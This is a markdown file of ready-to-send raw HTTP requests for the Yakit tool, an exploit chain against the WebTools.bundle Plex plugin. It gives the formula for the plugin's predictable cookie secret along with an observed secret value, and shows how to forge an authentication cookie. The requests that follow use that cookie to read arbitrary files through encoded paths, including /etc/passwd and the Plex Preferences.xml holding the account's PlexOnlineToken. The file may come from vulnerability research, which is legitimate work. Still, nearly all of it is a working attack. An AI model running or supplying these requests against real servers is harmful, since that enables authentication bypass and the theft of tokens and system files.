# WebTools.bundle — Yakit-ready raw HTTP requests

All requests use `Host: TARGET:33400` — replace `TARGET` with the actual host.

The `Cookie` value is a session cookie forged offline from the predictable `cookie_secret`
(see [../1.md](../1.md)). Generate it with:

```bash
python webtools_cookie_forge.py --base http://TARGET:33400
```

The forged cookie has the form `WebTools=MQ==|<unix-ts>|<HMAC-SHA1>`, where
`HMAC-SHA1 = HMAC-SHA1(cookie_secret, "WebTools" + "MQ==" + str(ts))` and
`cookie_secret = "__" + md5("ERROR." + str(i) + "WebTools") + "__"` for some `i` in `0..9999`
(observed: `i = 7245`, `cookie_secret = __16938769db2d67182ff1bd829ba5e1d0__`).

---

## 1. Fingerprint (no authentication)

```http
GET /version HTTP/1.1
Host: TARGET:33400
User-Agent: Mozilla/5.0
Connection: close

```

Expected: `200` with `{"version":"3.0.0"}`.

---

## 2. Forged cookie — authenticated request

```http
GET /api/v3/logs/list HTTP/1.1
Host: TARGET:33400
User-Agent: Mozilla/5.0
Cookie: WebTools=MQ==|<unix-ts>|<HMAC-SHA1>
Connection: close

```

Expected: `200` with the list of log file names.

---

## 3. Contrast — same endpoint without the cookie

```http
GET /api/v3/logs/list HTTP/1.1
Host: TARGET:33400
User-Agent: Mozilla/5.0
Connection: close

```

Expected: `302` with `Location: /login?next=%2Fapi%2Fv3%2Flogs%2Flist`.

---

## 4. Arbitrary file read — `/etc/passwd`

```http
GET /api/v3/logs/download/%2Fetc%2Fpasswd HTTP/1.1
Host: TARGET:33400
User-Agent: Mozilla/5.0
Cookie: WebTools=MQ==|<unix-ts>|<HMAC-SHA1>
Connection: close

```

Expected: `200` with the contents of `/etc/passwd`.

---

## 5. Arbitrary file read — Plex `Preferences.xml` (production token)

```http
GET /api/v3/logs/download/%2Fconfig%2FLibrary%2FApplication%20Support%2FPlex%20Media%20Server%2FPreferences.xml HTTP/1.1
Host: TARGET:33400
User-Agent: Mozilla/5.0
Cookie: WebTools=MQ==|<unix-ts>|<HMAC-SHA1>
Connection: close

```

Expected: `200` with an XML body containing `PlexOnlineToken` and `PlexOnlineMail`.

---

## 6. Contrast — read endpoint without the cookie

```http
GET /api/v3/logs/download/%2Fetc%2Fpasswd HTTP/1.1
Host: TARGET:33400
User-Agent: Mozilla/5.0
Connection: close

```

Expected: `302` with `Location: /login`.
